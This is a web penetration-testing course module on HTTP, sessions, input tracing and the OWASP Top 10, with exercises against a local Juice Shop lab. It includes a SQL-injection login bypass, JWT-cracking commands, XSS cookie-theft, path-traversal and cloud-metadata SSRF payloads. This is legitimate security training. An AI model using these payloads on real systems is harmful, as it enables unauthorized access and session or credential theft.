# 01 — Fundamentals: Core Concepts & Attacker Thinking

> Before you exploit anything, you need to understand how the web works at the wire level. This isn't theory for theory's sake — every concept here maps directly to an attack vector.

> 📋 **What You Will Do In This Section**
> - [ ] Understand the full HTTP request lifecycle and identify every attack surface
> - [ ] Decode a JWT token from Juice Shop and identify its structure
> - [ ] Analyze HTTP responses to extract technology stack intel
> - [ ] Map user input to vulnerability classes (the "Follow The Data" skill)
> - [ ] Complete the Pre-Engagement Checklist for your Juice Shop lab

---

## 🔴 HTTP Deep Dive

### The Request Lifecycle (Attacker's View)

When a browser sends a request, here's what happens — and where you attack:

```
[User Input] → [Client-Side JS] → [HTTP Request] → [Load Balancer/WAF] → [Web Server] → [App Logic] → [Database/API] → [Response]
     ↑              ↑                    ↑                  ↑                  ↑              ↑             ↑
   DOM XSS    Client bypass       Header injection      WAF bypass        SSRF/IDOR      SQLi/CMDi    Info disclosure
```

> 💡 **Why This Matters**
> Every step in this chain is a potential attack point. Your job as a pentester is to intercept, modify, and replay traffic at EVERY stage. Tools like Burp Suite let you sit between steps 2 and 3, intercepting and modifying every request before it reaches the server.

### HTTP Request Anatomy

```http
POST /api/v1/login HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Content-Type: application/json
Cookie: session=abc123; tracking=xyz
X-Forwarded-For: 127.0.0.1
Referer: https://target.com/login
Content-Length: 45

{"username":"admin","password":"password123"}
```

**Every single field above is an attack surface.** Let's break it down:

| Component | Attack Vectors |
|-----------|---------------|
| Method (POST/GET/PUT/DELETE) | Method override, verb tampering |
| Path (`/api/v1/login`) | Path traversal, forced browsing, IDOR |
| Host header | Host header injection, routing abuse |
| User-Agent | Log injection, SQLi via UA, WAF fingerprint |
| Cookie | Session hijacking, cookie manipulation, deserialization |
| Content-Type | Type confusion, XXE (XML), polyglot uploads |
| X-Forwarded-For | IP spoofing, access control bypass |
| Referer | CSRF bypass, access control bypass |
| Body | All injection classes (SQLi, XSS, CMDi, SSTI, etc.) |

#### 🧪 Try It Now — Inspect a Real Request (Juice Shop)

```bash
# Send a login request to Juice Shop and see the full HTTP exchange
curl -v -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"test"}'
```

> ✅ **Expected Output**
> ```
> > POST /rest/user/login HTTP/1.1
> > Host: localhost:3000
> > Content-Type: application/json
> >
> < HTTP/1.1 401 Unauthorized
> < X-Powered-By: Express
> < Content-Type: application/json; charset=utf-8
> < {"authentication":{"token":"","bid":0,"umail":""}}
> ```
> Key takeaway: You can see `X-Powered-By: Express` — meaning the backend is **Node.js/Express**. This tells you to focus on JavaScript injection, NoSQL errors, and prototype pollution.

> 🔧 **If Stuck**
> - `Connection refused` → Juice Shop isn't running. Start it: `docker start juiceshop`
> - No `-v` output → make sure you included the `-v` flag (verbose mode shows headers)

### 🧠 Attacker Thinking: Headers Are Input

Most developers don't sanitize headers. The `User-Agent`, `Referer`, `X-Forwarded-For`, and custom headers are often logged directly to databases or reflected in admin panels. This means:
- SQLi through User-Agent → hits the logging query
- XSS through Referer → renders in admin dashboard
- IP bypass through X-Forwarded-For → skips rate limiting

---

## 🔴 HTTP Response Analysis

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0
X-Powered-By: Express
Set-Cookie: session=eyJhbGciOiJIUzI1NiJ9...; Path=/; HttpOnly
Content-Type: application/json
X-Request-Id: 7a3b2c1d-4e5f-6789-abcd-ef0123456789
Strict-Transport-Security: max-age=31536000

{"status":"success","user":{"id":1,"role":"admin"}}
```

**What to extract from every response:**

| Header | Intelligence |
|--------|-------------|
| `Server` | Technology stack identification → exploit lookup |
| `X-Powered-By` | Framework identification → known CVE search |
| `Set-Cookie` flags | Missing `HttpOnly` = XSS can steal sessions. Missing `Secure` = session over HTTP. Missing `SameSite` = CSRF possible |
| `X-Request-Id` | Server internals leaking, useful for log correlation |
| `HSTS` | Presence/absence tells you about TLS posture |
| Response body | Data exposure, internal IDs, role information |

> 💡 **Why This Matters**
> Response headers are accidental intelligence. Developers rarely strip them, and they reveal the exact technology stack, which narrows your attack toolbox immediately.

#### 🧪 Try It Now — Extract Juice Shop's Stack

```bash
# Grab just the response headers from Juice Shop
curl -sI http://localhost:3000 | head -15
```

> ✅ **Expected Output**
> ```
> HTTP/1.1 200 OK
> X-Powered-By: Express
> Access-Control-Allow-Origin: *
> X-Content-Type-Options: nosniff
> X-Frame-Options: SAMEORIGIN
> Feature-Policy: payment 'self'
> Content-Type: text/html; charset=utf-8
> Content-Length: 6788
> ```
> **What this tells you:**
> - `X-Powered-By: Express` → Node.js backend
> - `Access-Control-Allow-Origin: *` → CORS is wide open — any website can make API calls to this server!
> - No `Strict-Transport-Security` → HSTS not set (in production, this would be a finding)

### Status Codes That Matter

```
200 OK          → Baseline. What does a normal response look like?
301/302         → Redirect chains — can you control the redirect destination?
400 Bad Request → Your payload broke something. The error message is gold.
401 Unauthorized→ Auth required. Can you bypass it? Different methods? IDOR?
403 Forbidden   → Access control exists. Can you bypass with headers, methods, path tricks?
404 Not Found   → But sometimes a "real" 404 vs "fake" 404 leaks info (response size differs)
405 Method NA   → Try other methods: PUT, DELETE, PATCH, OPTIONS
500 ISE         → Your input reached the backend and crashed something. This is GOOD.
502/503         → Backend is down or rate limited. Adjust timing.
```

### 🧠 Attacker Thinking: 403 and 500 Are Your Friends

A `403` means the resource EXISTS but you can't access it. That's better than a `404`. Try:
```
GET /admin → 403
GET /Admin → 200?
GET /admin/ → 200?
GET /admin;.js → 200? (Tomcat path normalization)
GET /./admin → 200? (Nginx path traversal)
```

A `500` means your input was processed but broke something. This often means injection is possible — the server tried to use your input and choked.

#### 🧪 Try It Now — Trigger a 500 on Juice Shop

```bash
# Send a malformed query to Juice Shop's search endpoint
curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/rest/products/search?q='))"
```

> ✅ **Expected Output**
> ```
> 500
> ```
> A `500` error! The unmatched parentheses broke the SQL query on the backend. This is your first clue that **SQL injection exists** in this parameter.

> 🔧 **If Stuck**
> - Getting `200` instead of `500` → Make sure the `q` parameter has the exact value `'))` (two closing parentheses)
> - Getting `000` or empty → Juice Shop may not be running. Check: `docker ps`

---

## 🔴 Cookies & Sessions Deep Dive

### Session Tokens — What To Look For

```
# JWT (JSON Web Token) — three base64 segments separated by dots
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

# Decode the payload (middle segment):
echo 'eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ' | base64 -d
# Output: {"user":"admin","role":"admin"}
```

> 💡 **Why This Matters**
> JWTs carry user identity and privileges in plain Base64 (NOT encrypted — only signed). If you can forge or tamper with a JWT, you can impersonate any user, including admins.

**JWT Attack Vectors:**
1. **Algorithm confusion**: Change `alg` from `RS256` to `HS256` and sign with the public key
2. **None algorithm**: Set `alg` to `none` and remove the signature
3. **Weak secret**: Brute-force the HMAC secret with `hashcat` or `jwt_tool`
4. **Missing expiration**: Token never expires = persistent access
5. **Payload tampering**: Change `role: user` to `role: admin` if signature isn't verified

#### 🧪 Try It Now — Decode a Juice Shop JWT

```bash
# Step 1: Get a JWT by logging in (use SQLi to bypass auth — don't worry about understanding this yet)
TOKEN=$(curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"x"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

echo "Your JWT: $TOKEN"

# Step 2: Decode the header (first segment)
echo "$TOKEN" | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool

# Step 3: Decode the payload (second segment)
echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

> ✅ **Expected Output**
> ```json
> // Header:
> {
>     "alg": "RS256",
>     "typ": "JWT"
> }
> // Payload (will contain something like):
> {
>     "status": "success",
>     "data": {
>         "id": 1,
>         "email": "admin@juice-sh.op",
>         "role": "admin"
>     },
>     "iat": 1234567890
> }
> ```
> **What this tells you**: The token uses `RS256` (asymmetric signing). The user is `admin@juice-sh.op` with `role: admin`. If you could change the algorithm to `none` or forge the signature, you could escalate privileges.

> 🔧 **If Stuck**
> - `parse error` → The base64 padding might be off. Try adding `==` to the end: `echo "SEGMENT==" | base64 -d`
> - `python3 -m json.tool` fails → Use `jq` instead: `echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq`
> - Empty TOKEN variable → The SQLi login may have failed. Run the curl command separately and check the response

```bash
# Brute force JWT secret
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# OR
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
```

### Cookie Security Flags Checklist

| Flag | Missing = | Test |
|------|-----------|------|
| `HttpOnly` | JavaScript can read the cookie → XSS = session theft | `document.cookie` in browser console |
| `Secure` | Cookie sent over HTTP → network sniffing = session theft | Check if site works on HTTP |
| `SameSite=Strict` | Cookie sent cross-origin → CSRF possible | Build a cross-site form submission |
| `Path=/` | Cookie scoped to entire domain | Not usually exploitable alone |
| `Domain` | Cookie shared across subdomains | Subdomain takeover = cookie access |

---

## 🔴 Input Flow Tracing

### The Critical Question: Where Does User Input End Up?

```
Client Input → URL parameters (?id=1)
             → POST body (form data, JSON, XML)
             → Headers (Cookie, User-Agent, Referer, custom)
             → File uploads (filename, content, MIME type)
             → WebSocket messages

                    ↓ Travels through:

Server Processing → URL routing (path traversal)
                  → Parameter binding (mass assignment)
                  → Template rendering (SSTI)
                  → Database queries (SQLi)
                  → OS commands (command injection)
                  → File system operations (LFI/RFI)
                  → HTTP requests to other services (SSRF)
                  → Log files (log injection)
                  → Email templates (header injection)
                  → PDF generation (SSRF, XSS in PDF)
```

> 💡 **Why This Matters**
> "Following the data" is THE core pentesting skill. If you can answer "where does my input end up?", you can pick the right attack. Input that goes into a SQL query needs SQLi payloads. Input that gets rendered in HTML needs XSS payloads. Wrong category = wasted time.

### Mapping Input to Vulnerability Classes

| Input Destination | Primary Vulnerability | Secondary |
|-------------------|-----------------------|-----------|
| SQL Query | SQLi | Second-order SQLi |
| HTML Template | Reflected/Stored XSS | SSTI |
| OS Command | Command Injection | Argument Injection |
| File Path | LFI/RFI, Path Traversal | Symlink attacks |
| HTTP Request (server-side) | SSRF | CSRF |
| LDAP Query | LDAP Injection | Auth bypass |
| XML Parser | XXE | Billion Laughs DoS |
| Deserialization | RCE | DoS |
| Log File | Log Injection/Forgery | Log-based SQLi |

### 🧠 Attacker Thinking: Follow The Data

Never just test the obvious parameter. Trace where EACH piece of user-controlled data flows:

1. **Register a user** with username `<script>alert(1)</script>` — does the admin panel render it?
2. **Upload a file** with filename `../../../../etc/cron.d/shell` — does the server use the filename?
3. **Set your User-Agent** to `' OR 1=1--` — does it hit a logging database?
4. **Send a webhook URL** pointing to `http://169.254.169.254/latest/meta-data/` — does the server fetch it?

#### 🧪 Try It Now — Follow Data Through Juice Shop

```bash
# Where does the search input go? Let's trace it.
# Step 1: Send a normal search
curl -s "http://localhost:3000/rest/products/search?q=apple" | python3 -m json.tool | head -20

# Step 2: Send a SQL meta-character and check the error
curl -s "http://localhost:3000/rest/products/search?q='" 2>&1 | head -5
```

> ✅ **Expected Output**
> ```
> Step 1 (normal): JSON array of products containing "apple" in the name/description
> Step 2 (SQLi probe): An error message containing "SQLITE_ERROR" or SQL syntax error
> ```
> **Conclusion**: The `q` parameter goes directly into a **SQLite query** without sanitization. This confirms the input destination is a SQL query, so we know to use SQL injection payloads.

---

## 🔴 OWASP Top 10 — Mapped To Real Attacks

> 💡 **Why This Matters**
> The OWASP Top 10 is the industry-standard classification of web vulnerabilities. Bug bounty programs, compliance audits, and pentest reports all reference it. Knowing it maps your findings to recognized categories.

### A01:2021 — Broken Access Control

**What it is**: Users acting outside their intended permissions.

**Real-world pattern**:
```http
# Normal user views their profile
GET /api/users/1337/profile
Authorization: Bearer <user_token>

# IDOR — change the ID to access another user's data
GET /api/users/1/profile
Authorization: Bearer <user_token>

# Forced browsing — access admin functionality
GET /api/admin/users
Authorization: Bearer <user_token>

# Method-based bypass
# GET blocked, but what about:
POST /api/admin/users
PUT /api/admin/users
```

#### 🧪 Try It Now — IDOR on Juice Shop

```bash
# Step 1: Login as any user (using SQLi bypass for now)
TOKEN=$(curl -s -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"x"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

# Step 2: Access your own basket (basket 1 = admin user)
curl -s http://localhost:3000/rest/basket/1 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# Step 3: Access another user's basket (IDOR test)
curl -s http://localhost:3000/rest/basket/2 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

> ✅ **Expected Output**
> ```json
> // Basket 1 — admin's basket: returns product data
> { "status": "success", "data": { "id": 1, "Products": [...] } }
> // Basket 2 — another user's basket: if this also returns data, IDOR exists!
> { "status": "success", "data": { "id": 2, "Products": [...] } }
> ```

**Checklist**:
- [ ] Can you access other users' data by changing IDs?
- [ ] Can you access admin functions with a regular user token?
- [ ] Can you change the HTTP method to bypass restrictions?
- [ ] Does the API enforce authorization on EVERY endpoint?
- [ ] Can you escalate privileges by modifying your own user object? (mass assignment)

---

### A02:2021 — Cryptographic Failures

**Real-world pattern**:
```bash
# Check TLS configuration
nmap --script ssl-enum-ciphers -p 443 target.com
testssl.sh target.com

# Look for:
# - Weak ciphers (RC4, DES)
# - Old TLS versions (TLS 1.0, 1.1)
# - Self-signed certificates
# - Missing HSTS header
# - Passwords stored as MD5/SHA1 without salt (check leaked data)
```

---

### A03:2021 — Injection

**The #1 attack class.**

```
SQL:   ' OR 1=1-- -     →  Bypasses authentication, dumps databases
XSS:   <script>alert(document.cookie)</script>  →  Steals sessions
CMDi:  ;id;              →  Executes system commands
SSTI:  {{7*7}}           →  Template injection, often leads to RCE
LDAP:  *)(|(&            →  Dumps directory entries
```

Detailed exploitation in `03-web-exploitation/`.

---

### A04:2021 — Insecure Design

**This is about logic flaws, not implementation bugs.**

Examples:
- Password reset sends a 4-digit code → brute forceable in minutes
- "Forgot password" reveals whether an email exists → user enumeration
- Shopping cart calculates price client-side → modify the price parameter
- API returns more data than the UI shows → check the raw response

---

### A05:2021 — Security Misconfiguration

**Real-world checklist**:
```bash
# Default credentials
admin:admin, admin:password, root:root, test:test

# Debug/error pages exposed
/debug, /trace, /actuator, /elmah.axd, /_debugbar

# Directory listing enabled
Browse to any directory path — does it list files?

# Unnecessary services exposed
nmap -sV -p- target.com  # Full port scan

# CORS misconfiguration
curl -H "Origin: https://evil.com" -I https://target.com/api/data
# Check Access-Control-Allow-Origin in response
```

#### 🧪 Try It Now — Check Juice Shop CORS

```bash
# Test if Juice Shop has CORS misconfiguration
curl -s -I -H "Origin: https://evil.com" http://localhost:3000/rest/products/search?q=test | grep -i "access-control"
```

> ✅ **Expected Output**
> ```
> Access-Control-Allow-Origin: *
> ```
> `*` means ANY website can make API requests to Juice Shop — a classic CORS misconfiguration. In production, this would allow an attacker's website to steal data from authenticated users.

---

### A06:2021 — Vulnerable & Outdated Components

```bash
# Check JavaScript libraries
# In browser console:
jQuery.fn.jquery  # jQuery version
angular.version   # Angular version
React.version     # React version

# Check server technologies
whatweb target.com
wappalyzer (browser extension)

# Search for CVEs
searchsploit apache 2.4.49
searchsploit nginx 1.18
```

---

### A07:2021 — Identification & Authentication Failures

**Testing checklist**:
- [ ] Can you brute force the login? (No rate limiting / account lockout)
- [ ] Are default credentials present?
- [ ] Is multi-factor authentication bypassable?
- [ ] Does the password reset flow leak information?
- [ ] Can you reuse an old session after logout?
- [ ] Is the session token predictable?

---

### A08:2021 — Software & Data Integrity Failures

**Examples**:
- Deserialization of untrusted data (Java `ObjectInputStream`, PHP `unserialize`, Python `pickle`)
- CI/CD pipeline compromise
- Unsigned software updates

---

### A09:2021 — Security Logging & Monitoring Failures

**From attacker's perspective**: This means you can be louder. No monitoring = no detection.

But verify first:
```bash
# Send a deliberately noisy scan
nikto -h target.com

# Wait. If nothing happens (no IP block, no CAPTCHA), monitoring is weak.
# This lets you increase scan speed and aggressiveness.
```

---

### A10:2021 — Server-Side Request Forgery (SSRF)

**The DevOps-killer vulnerability** — because cloud metadata is the target:

```bash
# Classic SSRF payloads
http://169.254.169.254/latest/meta-data/          # AWS
http://metadata.google.internal/computeMetadata/v1/ # GCP
http://169.254.169.254/metadata/instance           # Azure

# Through URL parameters, webhooks, PDF generators, image fetchers, etc.
```

Detailed in `03-web-exploitation/`.

---

## 🔴 Trust Boundaries

### What Is A Trust Boundary?

A trust boundary is the line where data transitions from one trust level to another. Every time data crosses a boundary, it should be validated.

```
[Internet] ──── TRUST BOUNDARY ──── [DMZ/WAF]
                                        │
                                  TRUST BOUNDARY
                                        │
                                   [Web Server]
                                        │
                                  TRUST BOUNDARY
                                        │
                                   [App Server]
                                        │
                                  TRUST BOUNDARY
                                        │
                                    [Database]
                                        │
                                  TRUST BOUNDARY
                                        │
                               [Internal Services]
```

### API Trust Boundary Example

```
Mobile App  ──→  API Gateway  ──→  Auth Service  ──→  User Service  ──→  Payment Service
    │               │                   │                  │                    │
 Client-side     Rate limiting       Token validation   Authorization     Input validation
 validation      WAF rules           Session mgmt       RBAC               Encryption
    │               │                   │                  │                    │
 BYPASSABLE    MIGHT BE BYPASSED     MIGHT HAVE FLAWS   MIGHT HAVE IDOR     MIGHT TRUST
 ALWAYS         (header tricks)      (JWT confusion)    (missing checks)    UPSTREAM DATA
```

### 🧠 Attacker Thinking: Microservices Trust Each Other

In microservice architectures, Service A often trusts data from Service B without re-validating. If you can poison data in one service, it flows trusted into others. This is called **transitive trust abuse**.

Example: You register with username `admin` in the user service → the billing service trusts the username and gives admin-level access.

---

## 🔴 Common Mistakes (Beginners)

1. **Scanning without understanding**: Running `nmap -A` without knowing what the flags do or what the output means
2. **Ignoring responses**: Not reading error messages, stack traces, or verbose responses
3. **Only testing visible parameters**: Ignoring headers, cookies, and hidden parameters
4. **Not establishing a baseline**: You need to know what "normal" looks like before you can spot "abnormal"
5. **Tool dependency**: Using SQLMap before understanding manual SQLi
6. **Not documenting**: If you don't write it down during the test, you'll forget

---

## 📋 Pre-Engagement Checklist

> 💡 **Why This Matters**
> Professional pentesting isn't just hacking — it's a structured process. Skipping pre-engagement preparation leads to scope creep, legal problems, and missed findings. Complete this checklist BEFORE touching the target.

- [ ] Scope defined (IPs, domains, excluded targets)
- [ ] Written authorization obtained
- [ ] Rules of engagement clear (testing hours, DoS allowed?, social engineering?)
- [ ] Lab environment ready (Burp, VM, wordlists)
- [ ] Note-taking system set up (CherryTree, Obsidian, plain markdown)
- [ ] Screenshot tool ready
- [ ] Baseline requests captured for target
- [ ] Emergency contacts documented (if something breaks)

#### 🧪 Try It Now — Complete Pre-Engagement for Juice Shop

```markdown
# YOUR Pre-Engagement Document (fill this in)

## Target: OWASP Juice Shop (http://localhost:3000)
- Scope: localhost:3000 (all endpoints)
- Authorization: Self-hosted lab (full authorization)
- Rules of Engagement: All techniques allowed, no rate limits
- Testing Hours: Anytime
- Lab Ready: Burp Suite ☐, Docker ☐, Python3 ☐
- Notes: Using [your tool] for documentation
- Baseline: Normal search returns 200 with JSON array
```

> ✅ **Expected Output**
> You should have a filled-out document you can reference throughout the remaining modules. This becomes your habit for real engagements.

---

## 🧠 Section Complete — Self-Check

Before moving to `01-fundamentals/labs.md`, verify you can:

- [ ] Send HTTP requests with `curl -v` and read both request and response headers
- [ ] Decode a JWT token from command line (`echo TOKEN | cut -d'.' -f2 | base64 -d`)
- [ ] Trigger a `500` error on Juice Shop's search endpoint
- [ ] Identify the Juice Shop tech stack from response headers (`Express`, `Node.js`)
- [ ] Explain why a `403` response is better than a `404` from an attacker's perspective
